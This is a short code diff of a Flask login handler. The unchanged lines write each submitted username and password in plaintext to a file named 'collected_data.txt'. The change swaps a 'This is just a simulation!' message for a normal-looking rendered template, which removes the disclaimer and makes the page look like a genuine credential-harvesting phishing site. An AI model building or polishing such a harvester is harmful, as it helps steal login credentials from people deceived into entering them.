@@ -17,7 +17,7 @@ def handle_login():
     with open('collected_data.txt', 'a') as f:
         f.write(f"Username: {username}, Password: {password}\n")
 
-    return "Your credentials have been submitted! (This is just a simulation!)"
+    return render_template('submit.html')
 
 if __name__ == '__main__':
     app.run(debug=True)
